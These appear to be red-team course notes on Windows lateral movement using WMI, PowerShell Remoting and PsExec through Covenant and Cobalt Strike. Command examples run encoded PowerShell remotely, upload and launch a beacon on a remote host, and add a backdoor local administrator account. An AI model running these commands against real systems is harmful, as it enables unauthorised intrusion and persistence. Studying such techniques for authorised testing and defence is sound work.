Several could be used for Lateral Movement:
1. WMI
2. PowerShell Remoting
3. PsExec

For each lateral movement command in Covenant, such as WMIGrunt, there's an equivalent Command command (confusing), like WMICommand.Â  Where WMIGrunt only allows you to specify a listener to execute, WMICommand allows you to execute any arbitrary command.

Similarly, Cobalt Strike separates its capabilities into **jump [method\] [target\] [listener]** and **remote-exec [method] [target] [command]**.

## WMIC

#### WMIC from CMD
```
wmic /node:"wkstn-4945" /user:"cyberbotic.io\\n.lamb" /password:"REDACTED" process call create "powershell -enc \[...snip...\]"
```

#### WMIC from Covenant
```
> wmigrunt computer-name powershell
> connect computer-name mysvc
```

#### WMIC from Cobalt Strike
WMI is not built into Cobalt Strike's **jump** command, but it is in **remote-exec**. As such, we have some free reign to decide how to deliver a payload.

We could generate and upload a payload to disk, whether that be an exe, ps1, dll or even something a little left-field like an xml/csproj. Or keep it simple and use a powershell one-liner (take care with one-liners as there's command length limit).

```
beacon> upload C:\payloads\tcp-beacon.exe (\\wkstn-4945\\c$\\Windows\\Temp\\tcp-beacon.exe)

beacon> remote-exec wmi wkstn-4945 C:\\Windows\\Temp\\tcp-beacon.exe

beacon> connect wkstn-4945 1337
```

## PowerShell remoting
The **PowerShellRemotingCommand** task allows us to execute PowerShell on a remote system and like WMICommand, can use our current token or alternate credentials. 

PowerShell Remoting can also return output from the target system, so it works well for general enumeration as well as lateral movement.

Covenant Example:
```
> PowerShellRemotingCommand wkstn-4945 "whoami; hostname"
> PowerShellRemotingCommand wkstn-4945 "powershell -enc \[...snip...\]"
```

Cobalt Strike Example:
```
beacon> jump winrm64 wkstn-4945 tcp
beacon> remote-exec winrm wkstn-4945 whoami; hostname
```

## PSExec
Covenant:
```
> psexec pc-name servicebin
> connect pc-name mysvc
```

Cobalt:
```
beacon> jump psexec64 wkstn-4945 tcp
```
with remote-exec:
```
beacon> remote-exec psexec wkstn-4945 cmd.exe /c "net user rastamouse Passw0rd! /add && net localgroup administrators rastamouse /add"
```
